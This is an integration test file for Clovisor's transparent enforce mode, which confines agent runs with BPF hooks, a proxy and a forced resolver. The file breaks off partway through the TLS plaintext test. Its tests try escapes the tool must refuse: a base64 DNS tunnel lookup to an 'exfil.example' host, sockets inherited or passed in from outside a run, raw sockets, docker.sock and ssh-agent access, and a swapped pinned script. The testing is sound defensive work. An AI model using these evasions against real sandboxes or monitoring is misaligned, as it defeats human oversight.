// Copyright (c) Authors of Clovisor
//
// All rights reserved. This program and the accompanying materials
// are made available under the terms of the Apache License, Version 2.0
// which accompanies this distribution, and is available at
// http://www.apache.org/licenses/LICENSE-2.0

//go:build integration

package integration

// TestTransparent runs transparent enforce mode end to end (milestone
// 3.7): cgroup identity, the BPF hooks, the transparent listener, the
// forced resolver and the UDP lockdown, with clients that ignore the
// proxy. It needs a privileged container on a Linux host with BPF and
// cgroup v2, so it runs only when asked:
//
//	make integration-transparent     # DOCKER="sudo docker" if needed
//
// The agent container shares the host's cgroup and PID namespaces (the
// hooks attach to host cgroups, and the node agent finds Envoy by pid),
// but keeps runs under a cgroup of its own and pins in a bpffs of its
// own, so it does not disturb a node agent on the host. Envoy shares the
// agent container's network namespace, where the transparent listener
// and the resolver are on loopback.

import (
	"crypto/rand"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"
)

func TestTransparent(t *testing.T) {
	if os.Getenv("CLOVISOR_IT_TRANSPARENT") == "" {
		t.Skip("set CLOVISOR_IT_TRANSPARENT=1: needs a privileged container, BPF and cgroup v2")
	}
	docker := strings.Fields(os.Getenv("DOCKER"))
	if len(docker) == 0 {
		docker = []string{"docker"}
	}
	if _, err := exec.LookPath(docker[0]); err != nil {
		t.Skip("docker not found")
	}
	var tag [4]byte
	rand.Read(tag[:])
	dir := t.TempDir()
	if os.Getenv("CLOVISOR_IT_KEEP") != "" {
		var err error
		if dir, err = os.MkdirTemp("", "clovisor-it-"); err != nil {
			t.Fatal(err)
		}
	}
	e := &env{t: t, docker: docker, tag: fmt.Sprintf("%x", tag), dir: dir}
	if err := os.Chmod(e.dir, 0o755); err != nil {
		t.Fatal(err)
	}
	e.build()
	e.buildBPF()
	e.pki()
	e.startTransparent()

	t.Run("status", e.testStatus)
	t.Run("https-ignoring-proxy", e.testTransparentHTTPS)
	t.Run("address-without-name", e.testAddressOnly)
	t.Run("raw-tcp-by-name", e.testRawByName)
	t.Run("dns", e.testForcedDNS)
	t.Run("udp", e.testUDP)
	t.Run("loopback", e.testLoopback)
	t.Run("inherited-socket", e.testInheritedSocket)
	t.Run("socket-families", e.testSocketFamilies)
	t.Run("passed-in-socket", e.testPassedInSocket)
	t.Run("unix-sockets", e.testUnixSockets)
	t.Run("host-daemons", e.testHostDaemons)
	t.Run("exec", e.testExec)
	t.Run("exec-hash", e.testExecHash)
	t.Run("tls-plaintext", e.testTLSPlaintext)
	t.Run("tunnel-identity", e.testTunnelIdentity)
	t.Run("sessions", func(t *testing.T) {
		e.testSessions(t, "tp", "tp-sub", "unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy; ", true)
	})
	t.Run("forged-identity", func(t *testing.T) {
		e.forgedIdentity(t, "tp-agents", "unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy; ")
	})
	t.Run("agents", func(t *testing.T) {
		e.runAgents(t, agentSuite{audit: "tp-agents", enforce: "tp-agents-enforce", transparent: true,
			prefix: "unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy; "})
	})
	t.Run("langgraph", func(t *testing.T) {
		e.runLangGraph(t, "tp-agents", "unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy; ", false)
	})
	t.Run("tool-calls", e.testToolCalls)
	t.Run("sub-agents", e.testSubAgents)
	t.Run("run-udp-icmp", e.testRunNet)
	t.Run("content", e.testTransparentContent)
	t.Run("limits", e.testTransparentLimits)
	t.Run("duration", e.testDuration)
	t.Run("models", e.testTransparentModels)
	t.Run("budgets", e.testTransparentBudgets)
	t.Run("ask", e.testTransparentAsk)
	t.Run("quic", e.testQUIC)
	t.Run("check-transparent", e.testCheckTransparent)
	t.Run("restart", e.testRestart)
	t.Run("fail-closed", e.testFailClosed) // last: stops the node agent
	if t.Failed() || os.Getenv("CLOVISOR_IT_LOG") != "" {
		out, _, _ := e.sh("cat /var/log/node-agent.log")
		t.Logf("node agent log:\n%s", out)
	}
}

// buildBPF compiles the BPF object into the shared bin directory.
func (e *env) buildBPF() {
	root, _ := filepath.Abs("..")
	cmd := exec.Command("make", "bpf")
	cmd.Dir = root
	if out, err := cmd.CombinedOutput(); err != nil {
		e.t.Fatalf("make bpf: %v\n%s", err, out)
	}
	data, err := os.ReadFile(filepath.Join(root, "libclovisor/ebpf/agent_audit.o"))
	if err != nil {
		e.t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(e.dir, "bin", "agent_audit.o"), data, 0o644); err != nil {
		e.t.Fatal(err)
	}
}

func (e *env) agentsCgroup() string { return "clovisor-it-" + e.tag }

// py writes a Python script into the bin directory the containers mount,
// and returns the command that runs it: scripts run inside sh -c '...',
// where inline Python would need quoting.
func (e *env) py(name, src string) string {
	e.t.Helper()
	if err := os.WriteFile(filepath.Join(e.dir, "bin", name+".py"), []byte(src), 0o644); err != nil {
		e.t.Fatal(err)
	}
	return "python3 /it/bin/" + name + ".py"
}

// stopNodeAgent stops the node agent as an operator would (SIGINT).
func (e *env) stopNodeAgent() error {
	_, errOut, err := e.sh("kill -INT $(cat /run/node-agent.pid)")
	if err != nil {
		return fmt.Errorf("%v: %s", err, errOut)
	}
	return nil
}

// startNodeAgent starts the node agent in the agent container, appending
// to its log, as the suite runs it: transparent enforce with QUIC.
func (e *env) startNodeAgent() {
	e.run("exec", "-d", e.name("agent"), "sh", "-c",
		"echo $$ > /run/node-agent.pid; exec /it/bin/node-agent -identity cgroup -bpf /it/bin/agent_audit.o"+
			" -agents-cgroup "+e.agentsCgroup()+
			" -policy-dir /etc/clovisor/policy -proxy-listen 127.0.0.1:18000 -envoy-upstream-ca /run/clovisor/upstream.pem"+
			" -transparent enforce -quic -uprobes -udp-allow "+e.originIP+":5000 >> /var/log/node-agent.log 2>&1")
}

// startTransparent brings up the origin (TLS, a banner port, a UDP echo),
// a privileged agent container with the node agent in transparent
// enforce mode, and Envoy in its network namespace.
func (e *env) startTransparent() {
	t := e.t
	t.Cleanup(e.cleanup)
	e.run("network", "create", e.name("net"))
	e.run("volume", "create", e.name("run"))
	e.startOrigin("-banner", ":2222", "-udp-echo", ":5000,:5002")
	// A QUIC server for every name the origin answers (milestone 5.6).
	e.run("exec", "-d", e.name("origin"), "/it/bin/quictest", "server", "-listen", ":443")
	e.originIP = strings.TrimSpace(e.run("inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", e.name("origin")))
	if e.originIP == "" {
		t.Fatal("no origin address")
	}
	agentArgs := []string{"run", "-d", "--name", e.name("agent"), "--network", e.name("net"),
		"--privileged", "--cgroupns", "host", "--pid", "host",
		"-v", filepath.Join(e.dir, "bin") + ":/it/bin:ro", "-v", filepath.Join(e.dir, "origin", "ca.crt") + ":/it/test-ca.crt:ro",
		"-v", e.name("run") + ":/run/clovisor"}
	agentArgs = e.withAgents(agentArgs)
	e.run(append(agentArgs, agentImage, "sleep", "infinity")...)
	// Runs' cgroups go as runs end; the agents cgroup itself is removed
	// here, before the container goes (cleanups run last-in first-out).
	t.Cleanup(func() {
		if os.Getenv("CLOVISOR_IT_KEEP") == "" {
			e.stopNodeAgent()
			time.Sleep(time.Second)
			// A run that outlived the node agent (fail-closed) leaves
			// its cgroup; remove the runs first, then their parent.
			cg := "/sys/fs/cgroup/" + e.agentsCgroup()
			e.sh("for r in " + cg + "/run-*; do [ -d \"$r\" ] && rmdir \"$r\"; done; rmdir " + cg)
		}
	})
	if _, errOut, err := e.sh("mkdir -p /etc/clovisor && mount -t bpf bpf /sys/fs/bpf"); err != nil {
		t.Fatalf("prepare: %v %s", err, errOut)
	}
	e.run("cp", "policy-transparent", e.name("agent")+":/etc/clovisor/policy")
	// Without BPF LSM, exec rules cannot be enforced, and the node agent
	// refuses profiles that would gate exec. There, the profiles keep
	// them as audit only, and the checks that need BPF LSM skip
	// (needLSM): GitHub's runners boot without it.
	if lsm, _ := os.ReadFile("/sys/kernel/security/lsm"); !strings.Contains(","+strings.TrimSpace(string(lsm))+",", ",bpf,") {
		t.Log("BPF LSM not active on this host: exec rules are audit only, and the checks that need BPF LSM skip")
		if _, errOut, err := e.sh(`sed -i 's/^  exec:$/  exec:\n    audit_only: true/' /etc/clovisor/policy/*.yaml`); err != nil {
			t.Fatalf("audit-only exec: %v %s", err, errOut)
		}
	}
	// The policy names the origin by address (udp and icmp blocks); ping
	// sockets are for everyone, as on most distributions.
	if out, errOut, err := e.sh(`set -e
sed -i "s/ORIGIN_IP/` + e.originIP + `/g" /etc/clovisor/policy/*.yaml
echo "0 2147483647" > /proc/sys/net/ipv4/ping_group_range
chown -R root:root /etc/clovisor && chmod 755 /etc/clovisor/policy && chmod 644 /etc/clovisor/policy/*
cat /etc/ssl/certs/ca-certificates.crt /it/test-ca.crt > /run/clovisor/upstream.pem`); err != nil {
		t.Fatalf("prepare agent: %v\n%s%s", err, out, errOut)
	}
	e.startNodeAgent()
	if out, errOut, err := e.sh(`for i in $(seq 50); do [ -S /run/clovisor/agent.sock ] && [ -f /run/clovisor/envoy.json ] && exit 0; sleep 0.1; done
cat /var/log/node-agent.log; exit 1`); err != nil {
		t.Fatalf("node agent did not start: %v\n%s%s", err, out, errOut)
	}
	e.run("run", "-d", "--name", e.name("envoy"), "--network", "container:"+e.name("agent"),
		"-v", e.name("run")+":/run/clovisor", EnvoyImage, "-c", "/run/clovisor/envoy.json", "-l", "warn")
	if out, errOut, err := e.sh(`for i in $(seq 100); do /it/bin/agentctl status 2>/dev/null | grep -q 'Healthy       yes' && exit 0; sleep 0.1; done
/it/bin/agentctl status; exit 1`); err != nil {
		logs, _ := e.dockerCmd("logs", e.name("envoy")).CombinedOutput()
		t.Fatalf("node not healthy: %v\n%s%s\n%s", err, out, errOut, logs)
	}
}

// trun runs script as a run under the transparent test profile, with the
// proxy variables removed: every client here ignores the proxy.
func (e *env) trun(script string) (string, string) {
	e.t.Helper()
	return e.agentRun("tp", "unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy; "+script)
}

// timeline returns a run's timeline as agentctl prints it in JSON, once
// the run has ended.
func (e *env) timeline(runID string) string {
	e.t.Helper()
	for i := 0; i < 50; i++ {
		if out, _, err := e.sh("/it/bin/agentctl events --json " + runID); err == nil && strings.Contains(out, `"ended_at"`) {
			return out
		}
		time.Sleep(100 * time.Millisecond)
	}
	out, errOut, _ := e.sh("/it/bin/agentctl events --json " + runID)
	e.t.Fatalf("no finished timeline for %s:\n%s%s", runID, out, errOut)
	return ""
}

func (e *env) testStatus(t *testing.T) {
	out, _, err := e.sh("/it/bin/agentctl status")
	if err != nil {
		t.Fatal(err)
	}
	expect(t, out, "Transparent   enforce", "Healthy       yes", "Proxy gated   yes", "Envoy ready   yes", "Sockets       ")
}

func (e *env) testTransparentHTTPS(t *testing.T) {
	out, id := e.trun(`
curl -sS https://origin.test/allowed
echo "secret: $(curl -s https://origin.test/secret)"`)
	expect(t, out, "origin.test GET /allowed", `"message":"The secret endpoint is off limits for this agent."`)
	expect(t, e.timeline(id), `"verdict": "redirect"`, `"transparent": true`, `"sni": "origin.test"`)
}

func (e *env) testAddressOnly(t *testing.T) {
	// TLS to the origin's address with no name: no rule names the
	// address, and the run never looked a name up for it.
	out, id := e.trun(`curl -sk -o /dev/null https://` + e.originIP + `/allowed || echo refused`)
	expect(t, out, "refused")
	expect(t, e.timeline(id), `"method": "CONNECT"`, `"decision": "deny"`)
}

func (e *env) testRawByName(t *testing.T) {
	// SSH-like raw TCP by name: allowed through the run's own lookup. A
	// port the rule does not name is refused (the proxy closes it).
	out, id := e.trun(e.py("raw", `import socket
s = socket.create_connection(("origin.test", 2222), timeout=5)
print("banner", s.recv(32))
s = socket.create_connection(("origin.test", 2223), timeout=5)
print("2223", s.recv(32))
`))
	expect(t, out, "banner b'SSH-2.0-origin", "2223 b''")
	expect(t, e.timeline(id), `"resolved_name": "origin.test"`)
}

func (e *env) testForcedDNS(t *testing.T) {
	out, id := e.trun(`
getent hosts origin.test >/dev/null && echo "origin resolved"
getent hosts other.test >/dev/null || echo "other refused"
getent hosts aGVsbG8gd29ybGQ.x7k2.exfil.example >/dev/null || echo "tunnel refused"
` + e.py("dns", `import socket
try:
    socket.getaddrinfo("other.test", 443)
except OSError as err:
    print("python:", err)
`))
	expect(t, out, "origin resolved", "other refused", "tunnel refused", "python:")
	expect(t, e.timeline(id), `"dns_blocked"`, `"other.test"`, `"agvsbg8gd29ybgq.x7k2.exfil.example"`)
}

func (e *env) testUDP(t *testing.T) {
	out, id := e.trun(e.py("udp", `import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3)
for dst in [("8.8.8.8", 4443), ("`+e.originIP+`", 5001)]:
    try:
        s.sendto(b"x", dst)
        print("sent", dst)
    except OSError as err:
        print("refused", dst[1], err.errno)
s.sendto(b"ping", ("`+e.originIP+`", 5000))
print("echo", s.recvfrom(16)[0])
`))
	expect(t, out, "refused 4443 1", "refused 5001 1", "echo b'ping'")
	// One report per unconnected socket: the first refusal.
	expect(t, e.timeline(id), `"udp_refused": 1`, `"udp_refused_to"`, `"8.8.8.8"`)
}

func (e *env) testLoopback(t *testing.T) {
	// A host service on loopback, outside any run.
	e.run("exec", "-d", e.name("agent"), "python3", "-m", "http.server", "8766", "--bind", "127.0.0.1")
	time.Sleep(time.Second)
	out, _ := e.trun(`
python3 -m http.server 8765 --bind 127.0.0.1 >/dev/null 2>&1 &
sleep 1
echo "same run: $(curl -s -o /dev/null -w %{http_code} http://127.0.0.1:8765/)"
echo "host: $(curl -s http://127.0.0.1:8766/)"
kill $!`)
	expect(t, out, "same run: 200", "host: {", "node-local address")
}

func (e *env) testInheritedSocket(t *testing.T) {
	// A TCP socket opened before the run, as standard input, would bypass
	// the hooks: the run is refused.
	_, errOut, err := e.sh(`bash -c 'exec 3<>/dev/tcp/` + e.originIP + `/2222; /it/bin/agentctl run --profile tp -- true <&3'`)
	if err == nil || !strings.Contains(errOut, "network sockets created outside the run") {
		t.Fatalf("run with an inherited socket: %v %s", err, errOut)
	}
}

// needLSM skips a test of the BPF LSM socket hooks where BPF LSM is not
// active on the host.
func (e *env) needLSM(t *testing.T) {
	out, _, _ := e.sh("/it/bin/agentctl status")
	if !strings.Contains(out, "Sockets       enforce") {
		t.Skip("BPF LSM not active on this host")
	}
}

func (e *env) testSocketFamilies(t *testing.T) {
	e.needLSM(t)
	out, id := e.trun(e.py("families", `import socket
for fam, typ, proto, name in [(socket.AF_INET, socket.SOCK_RAW, 1, "raw"), (17, socket.SOCK_RAW, 0, "packet"),
                              (40, socket.SOCK_STREAM, 0, "vsock"), (socket.AF_NETLINK, socket.SOCK_RAW, 0, "netlink")]:
    try:
        socket.socket(fam, typ, proto)
        print(name, "created")
    except OSError as err:
        print(name, "refused", err.errno)
`))
	expect(t, out, "raw refused 1", "packet refused 1", "vsock refused 1", "netlink created")
	expect(t, e.timeline(id), `"sockets_refused": 3`, `"create inet socket, type 3, protocol 1"`)
}

func (e *env) testPassedInSocket(t *testing.T) {
	// A process outside the run connects to the origin and hands the
	// socket over a Unix socket to a process in the run, after the run has
	// started: its sends would meet no cgroup hook.
	e.needLSM(t)
	pass := e.py("fdpass", `import array, os, socket, sys
mode, path = sys.argv[1], sys.argv[2]
if mode == "serve":
    tcp = socket.create_connection(("`+e.originIP+`", 2222), timeout=5)
    srv = socket.socket(socket.AF_UNIX)
    srv.bind(path)
    srv.listen(1)
    c, _ = srv.accept()
    c.sendmsg([b"x"], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, array.array("i", [tcp.fileno()]))])
else:
    u = socket.socket(socket.AF_UNIX)
    u.connect(path)
    _, anc, _, _ = u.recvmsg(1, socket.CMSG_LEN(4))
    s = socket.socket(fileno=array.array("i", anc[0][2])[0])
    try:
        s.sendall(b"x")
        print("sent on the passed-in socket")
    except OSError as err:
        print("passed-in socket refused", err.errno)
`)
	e.run("exec", "-d", e.name("agent"), "sh", "-c", "rm -f /tmp/fd.sock; "+pass+" serve /tmp/fd.sock")
	time.Sleep(time.Second)
	out, id := e.trun(pass + " use /tmp/fd.sock")
	expect(t, out, "passed-in socket refused 1")
	expect(t, e.timeline(id), `"send inet socket created outside the run`)
}

// unixServe listens on the Unix socket path argv[1], open to everyone.
const unixServe = `import os, socket, sys
srv = socket.socket(socket.AF_UNIX)
if os.path.exists(sys.argv[1]):
    os.unlink(sys.argv[1])
srv.bind(sys.argv[1])
os.chmod(sys.argv[1], 0o777)
srv.listen(8)
while True:
    srv.accept()[0].close()
`

func (e *env) testUnixSockets(t *testing.T) {
	// Two sockets bound outside the run, one of them in unix.allow.
	e.needLSM(t)
	serve := e.py("unixserve", unixServe)
	for _, p := range []string{"/run/it-allowed.sock", "/run/it-denied.sock"} {
		e.run("exec", "-d", e.name("agent"), "sh", "-c", serve+" "+p)
	}
	time.Sleep(time.Second)
	out, id := e.trun(e.py("unixuse", `import socket
def connect(path):
    s = socket.socket(socket.AF_UNIX)
    try:
        s.connect(path)
        return "ok"
    except OSError as err:
        return "refused %d" % err.errno
print("allowed", connect("/run/it-allowed.sock"))
print("denied", connect("/run/it-denied.sock"))
own = socket.socket(socket.AF_UNIX)
own.bind("\0it-own")
own.listen(1)
print("own", connect("\0it-own"))
`) + "; /it/bin/agentctl status | grep -c Transparent")
	expect(t, out, "allowed ok", "denied refused 1", "own ok", "\n1\n")
	expect(t, e.timeline(id), `"path": "/run/it-denied.sock"`, `"verdict": "refused: unix"`)
}

// The host daemons the plan names (milestone 4.8): each acts for whoever
// connects, so a run reaching one escapes its policy. Docker's socket is
// root; ssh-agent signs with the user's keys; systemd-resolved resolves
// names around the forced resolver (finding 1). None is in tp's
// unix.allow, so all are refused.
func (e *env) testHostDaemons(t *testing.T) {
	e.needLSM(t)
	serve := e.py("unixserve", unixServe)
	for _, p := range []string{"/run/docker.sock", "/run/systemd/resolve/io.systemd.Resolve"} {
		e.run("exec", "-d", e.name("agent"), "sh", "-c", "mkdir -p $(dirname "+p+") && "+serve+" "+p)
	}
	// A real ssh-agent, with a key in it, outside the run.
	if _, errOut, err := e.sh(`rm -rf /tmp/ssh-it && mkdir -m 700 /tmp/ssh-it &&
ssh-agent -a /tmp/ssh-it/agent.sock | sed -n "s/^SSH_AGENT_PID=\([0-9]*\);.*/\1/p" > /tmp/ssh-it/pid && chmod 777 /tmp/ssh-it /tmp/ssh-it/agent.sock &&
ssh-keygen -q -t ed25519 -N "" -f /tmp/ssh-it/key && SSH_AUTH_SOCK=/tmp/ssh-it/agent.sock ssh-add -q /tmp/ssh-it/key &&
SSH_AUTH_SOCK=/tmp/ssh-it/agent.sock ssh-add -l > /dev/null`); err != nil {
		t.Fatalf("ssh-agent: %v %s", err, errOut)
	}
	time.Sleep(time.Second)
	out, id := e.trun(`SSH_AUTH_SOCK=/tmp/ssh-it/agent.sock ssh-add -l >/dev/null 2>&1 && echo "ssh-agent: keys listed" || echo "ssh-agent: refused"
` + e.py("unixuse2", `import socket
for p in ["/run/docker.sock", "/run/systemd/resolve/io.systemd.Resolve"]:
    s = socket.socket(socket.AF_UNIX)
    try:
        s.connect(p)
        print(p, "ok")
    except OSError as err:
        print(p, "refused", err.errno)
`))
	expect(t, out, "ssh-agent: refused", "/run/docker.sock refused 1", "io.systemd.Resolve refused 1")
	expect(t, e.timeline(id), `"path": "/tmp/ssh-it/agent.sock"`, `"path": "/run/docker.sock"`,
		`"path": "/run/systemd/resolve/io.systemd.Resolve"`)
	e.sh("kill $(cat /tmp/ssh-it/pid); rm -f /run/docker.sock /run/systemd/resolve/io.systemd.Resolve")
}

func (e *env) testExec(t *testing.T) {
	// Root-owned copies of true: one in /tmp, which anyone can write, so the
	// trusted-path test fails; one under /tmp/ok, which exec.allow names.
	e.needLSM(t)
	if _, errOut, err := e.sh("mkdir -p /tmp/ok && cp /bin/true /tmp/t && cp /bin/true /tmp/ok/t"); err != nil {
		t.Fatal(errOut)
	}
	out, id := e.trun(`
/bin/true && echo "system: ran"
/tmp/t && echo "tmp: ran" || echo "tmp: refused"
/tmp/ok/t && echo "allowed dir: ran"`)
	expect(t, out, "system: ran", "tmp: refused", "allowed dir: ran")
	tl := e.timeline(id)
	expect(t, tl, `"path": "/tmp/t"`, `"verdict": "refused: exec"`, `"trusted": false`)
}

// pinnedScript is the content tp-hash pins by its SHA-256.
const pinnedScript = "#!/bin/sh\necho pinned ran\n"

func (e *env) testExecHash(t *testing.T) {
	// tp-hash pins pinned.sh's content at two paths (milestone 5.7): in the
	// container's /tmp (overlay, so hashed at every exec) and in the bin
	// directory, a bind mount of the host's tmpfs, where the kernel caches
	// the hash once the file has been unchanged for a minute.
	e.needLSM(t)
	host := filepath.Join(e.dir, "bin", "pinned.sh")
	var st syscall.Stat_t
	if err := syscall.Stat(host, &st); err != nil {
		t.Fatal(err)
	}
	if wait := time.Until(time.Unix(st.Ctim.Unix()).Add(62 * time.Second)); wait > 0 {
		t.Logf("waiting %v for pinned.sh to be cacheable", wait.Round(time.Second))
		time.Sleep(wait)
	}
	s := e.script("hash", `mkdir -p /tmp/h
cp /it/bin/pinned.sh /tmp/h/pinned.sh
/tmp/h/pinned.sh && echo "tmp pinned: ran"
printf "#!/bin/sh\necho changed ran\n" > /tmp/h/pinned.sh
/tmp/h/pinned.sh || echo "tmp changed: refused"
cp /tmp/h/pinned.sh /tmp/h/copy.sh && /tmp/h/copy.sh && echo "copy: ran"
cp /it/bin/pinned.sh /tmp/h/pinned.sh && /tmp/h/pinned.sh && echo "tmp restored: ran"
/it/bin/pinned.sh && /it/bin/pinned.sh && echo "bin pinned: ran twice"
`)
	out, id := e.agentRun("tp-hash", s)
	expect(t, out, "tmp pinned: ran", "tmp changed: refused", "changed ran", "copy: ran", "tmp restored: ran", "bin pinned: ran twice")
	if strings.Contains(out, "changed ran\ntmp changed") {
		t.Errorf("changed content ran at the pinned path:\n%s", out)
	}
	tl := e.timeline(id)
	sum := `"hash": "sha256:d4ed4315da74e2cdbbefa11fec9fbcf04cc2e781b1f51cc2f3ad2230c29e24b1"`
	expect(t, tl, sum, `"hash_cached": true`, `"hash_mismatch": true`, "is not a hash exec.allow lists for this path")

	// Changed on the host after the kernel cached it: refused at once,
	// since the write changes the inode's change time.
	if err := os.WriteFile(host, []byte("#!/bin/sh\necho evil ran\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	out, _ = e.agentRun("tp-hash", `/it/bin/pinned.sh || echo "bin changed: refused"`)
	expect(t, out, "bin changed: refused")
	if strings.Contains(out, "evil ran") {
		t.Errorf("a stale cached hash let changed content run:\n%s", out)
	}
	if err := os.WriteFile(host, []byte(pinnedScript), 0o755); err != nil {
		t.Fatal(err)
	}
	out, _ = e.agentRun("tp-hash", `/it/bin/pinned.sh && echo "bin restored: ran"`)
	expect(t, out, "bin restored: ran")
}

func (e *env) testTLSPlaintext(t *testing.T) {
	// Milestone 6.2: under tp-observe, requests from curl (OpenSSL), Python
	// (OpenSSL, loaded at import), git (GnuTLS, through libcurl-gnutls) and
	// Debian's Node (the system OpenSSL; 6.6) are read from their TLS
	// plaintext. Each process is held at exec
	// until its probes are attached, so even curl, which is done in
	// milliseconds, is seen. A run under tp, which does not ask, is not.
	status, _, _ := e.sh("/it/bin/agentctl status")
	expect(t, status, "TLS capture   for profiles that ask: ", "libssl.so.3", "libgnutls.so.30")
	s := e.script("tlscap", `for i in 1 2 3; do curl -s -o /dev/null -w "curl$i %{http_code}\n" "https://origin.test/allowed?try=$i"; done
python3 -c 'import urllib.request; print("python", urllib.request.urlopen("https://origin.test/headers").status)'
git ls-remote https://origin.test/repo.git >/dev/null 2>&1; echo "git done"
node -e 'require("https").get("https://origin.test/node?try=1", r => { console.log("node", r.statusCode); r.resume() })'
`)
	out, id := e.agentRun("tp-observe", "unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy; "+s)
	expect(t, out, "curl1 200", "curl2 200", "curl3 200", "python 200", "git done", "node 200")
	tl := e.timeline(id) // once the run's end is recorded
	shown, _, err := e.sh("/it/bin/agentctl events " + id)
	if err != nil {
		t.Fatal(err)
	}
	expect(t, shown, "Seen in TLS plaintext (4)")
	sec := shown[strings.Index(shown, "Seen in TLS plaintext"):]
	sec = sec[:strings.Index(sec, "Via proxy")]
	if !regexp.MustCompile(`GET origin.test/allowed +x3 +200 x3 \(libssl, HTTP/2\)`).MatchString(sec) ||
		!strings.Contains(sec, "GET origin.test/headers") || !regexp.MustCompile(`repo.git/info/refs .*\(gnutls, `).MatchString(sec) ||
		!regexp.MustCompile(`GET origin.test/node +x1 +200 x1 \(libssl, HTTP/1.1\)`).MatchString(sec) {
		t.Errorf("TLS plaintext section:\n%s", sec)
	}
	if strings.Contains(sec, "try=") {
		t.Errorf("a query string was kept:\n%s", sec)
	}
	expect(t, tl, `"type": "tls"`, `seen in the process (libssl, `)

	out, id = e.trun(`curl -s -o /dev/null -w "plain %{http_code}\n" https://origin.test/allowed`)
	expect(t, out, "plain 200")
	if tl := e.timeline(id); strings.Contains(tl, `"tls"`) {
		t.Errorf("a run whose profile does not ask was captured:\n%s", tl)
	}

	// Milestone 6.3: Go's crypto/tls, linked into each binary, probed
	// from its symbols, or from Go's function table once stripped. env
	// execs the client in its own process, which already had probes from
	// its first exec: the new binary is probed all the same.
	// mcp.test is tunnelled (milestone 6.5): the client sees the origin's
	// own certificate, so it trusts the test CA too.
	s = e.script("gotls", `cat "$SSL_CERT_FILE" /it/test-ca.crt > /tmp/trust.pem
SSL_CERT_FILE=/tmp/trust.pem /it/bin/gotls "https://origin.test/allowed?try=go" https://origin.test/headers https://mcp.test/tunnelled
env /it/bin/gotls-stripped https://origin.test/allowed
`)
	out, id = e.agentRun("tp-observe", "unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy; "+s)
	expect(t, out, "gotls HTTP/2.0 200")
	e.timeline(id)
	shown, _, err = e.sh("/it/bin/agentctl events " + id)
	if err != nil {
		t.Fatal(err)
	}
	expect(t, shown, "Programs with their own TLS (2)")
	if !regexp.MustCompile(`/it/bin/gotls +x1 +go1\.\d+\S* crypto/tls probed`).MatchString(shown) ||
		!regexp.MustCompile(`/it/bin/gotls-stripped +x1 +go1\.\d+\S* crypto/tls probed`).MatchString(shown) {
		t.Errorf("programs:\n%s", shown)
	}
	sec = shown[strings.Index(shown, "Seen in TLS plaintext"):]
	sec = sec[:strings.Index(sec, "Programs with their own TLS")]
	if !regexp.MustCompile(`GET origin.test/allowed +x2 +200 x2 \(go1\.\d+\S*, HTTP/2\)`).MatchString(sec) ||
		!regexp.MustCompile(`GET origin.test/headers +x1 +200 x1 \(go1`).MatchString(sec) ||
		!regexp.MustCompile(`GET mcp.test/tunnelled +x1 +200 x1 \(go1`).MatchString(sec) || strings.Contains(sec, "try=") {
		t.Errorf("Go TLS plaintext section:\n%s", sec)
	}
	// Milestone 6.5: origin.test was terminated, so the proxy saw its
	// requests; mcp.test was tunnelled, and only TLS plaintext showed them.
	expect(t, shown, "Visibility (2 destinations: 1 requests, 1 plaintext)")
	if !regexp.MustCompile(`mcp.test:443 +plaintext +by proxy, tls-plaintext: tunnelled without termination`).MatchString(shown) ||
		!regexp.MustCompile(`origin.test:443 +requests +by proxy\n`).MatchString(shown) {
		t.Errorf("visibility:\n%s", shown)
	}
	expect(t, e.timeline(id), `"visibility"`, `"seen": "plaintext"`)

	// Milestone 6.4: a rustls binary cannot be probed, and is listed as
	// not visible. Only with CLOVISOR_IT_RUSTLS (see build).
	if os.Getenv("CLOVISOR_IT_RUSTLS") != "" {
		out, id = e.agentRun("tp-observe", "/it/bin/rustls-bin --version >/dev/null && echo rustls ran")
		expect(t, out, "rustls ran")
		e.timeline(id)
		shown, _, _ = e.sh("/it/bin/agentctl events " + id)
		if !regexp.MustCompile(`/it/bin/rustls-bin +x1 +rustls \d+\.\d+\.\d+ not visible: rustls has no stable symbols`).MatchString(shown) {
			t.Errorf("rustls:\n%s", shown)
		}
	} else {
		t.Log("CLOVISOR_IT_RUSTLS unset: a rustls binary not checked")
	}

	// A Bun-compiled app makes its request with BoringSSL linked in
	// without symbols: it gets through, and is listed as not visible.
	// Only with CLOVISOR_IT_BUN (see build).
	if os.Getenv("CLOVISOR_IT_BUN") != "" {
		s = e.script("buntls", `cat "$SSL_CERT_FILE" /it/test-ca.crt > /tmp/trust.pem
NODE_EXTRA_CA_CERTS=/tmp/trust.pem /it/bin/bun-app "https://mcp.test/bun"
`)
		out, id = e.agentRun("tp-observe", "unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy; "+s)
		expect(t, out, "bun 200")
		e.timeline(id)
		shown, _, _ = e.sh("/it/bin/agentctl events " + id)
		// Tunnelled, and Bun's TLS not probed: the name is all there is,
		// and the report says why (milestone 6.5).
		if !regexp.MustCompile(`/it/bin/bun-app +x1 +Bun's BoringSSL not visible: Bun links BoringSSL in without its symbols`).MatchString(shown) ||
			strings.Contains(shown, "Seen in TLS plaintext") ||
			!regexp.MustCompile(`mcp.test:443 +name +by proxy: tunnelled without termination; TLS plaintext was asked for, but not visible in /it/bin/bun-app \(Bun's BoringSSL\)`).MatchString(shown) {
			t.Errorf("Bun app:\n%s", shown)
		}
	} else {
		t.Log("CLOVISOR_IT_BUN unset: a Bun-compiled app not checked")
	}

	// An official Node build links OpenSSL in and exports it, so the same
	// probes go on the node binary itself. Only with CLOVISOR_IT_NODE.
	if os.Getenv("CLOVISOR_IT_NODE") == "" {
		t.Log("CLOVISOR_IT_NODE unset: official Node not checked")
		return
	}
